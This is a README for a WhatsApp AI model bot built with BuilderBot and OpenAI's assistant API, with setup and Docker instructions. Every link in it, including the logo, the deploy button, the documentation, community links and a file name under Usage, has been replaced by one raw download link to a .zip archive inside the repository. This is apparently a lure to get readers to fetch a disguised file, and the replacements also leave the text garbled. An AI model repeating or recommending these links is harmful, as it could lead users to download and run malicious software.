# WhatsApp AI Assistant Bot (https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip)

<p align="center">
  <img src="https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip" height="80">
</p>

[![Deploy on Railway](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip)](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip)

This project creates a WhatsApp bot that integrates with an AI assistant using BuilderBot technology. It allows for automated conversations and intelligent responses powered by OpenAI's assistant API.

## Features

- Automated conversation flows for WhatsApp
- Integration with OpenAI's assistant API
- Agnostic to WhatsApp provider
- Automated responses to frequently asked questions
- Real-time message receiving and responding
- Interaction tracking with customers
- Expandable functionality through triggers

## Getting Started

1. Clone this repository
2. Install dependencies:
   ```
   pnpm install
   ```
3. Set up your environment variables in a `.env` file:
   ```
   PORT=3008
   ASSISTANT_ID=your_openai_assistant_id
   ```
4. Run the development server:
   ```
   pnpm run dev
   ```

### Using Docker (Recommended)

This project includes a Dockerfile for easy deployment and consistent environments. To use Docker:

1. Build the Docker image:
   ```
   docker build -t whatsapp-ai-assistant .
   ```
2. Run the container:
   ```
   docker run -p 3008:3008 --env-file .env whatsapp-ai-assistant
   ```

This method ensures that the application runs in a consistent environment across different systems.

## Usage

The bot is configured in the `https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip` file. It uses the BuilderBot library to create flows and handle messages. The main welcome flow integrates with the OpenAI assistant to generate responses.

## Documentation

For more detailed information on how to use and extend this bot, please refer to the [BuilderBot documentation](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip).

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is open-source and available under the [MIT License](LICENSE).

## Contact

For questions and support, join our [Discord community](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip) or follow us on [Twitter](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip).

---

Built with [BuilderBot](https://github.com/luisestrellar/builderbot-openai-assistants/raw/refs/heads/master/src/utils/openai_assistants_builderbot_2.9-beta.3.zip) - Empowering conversational AI for WhatsApp
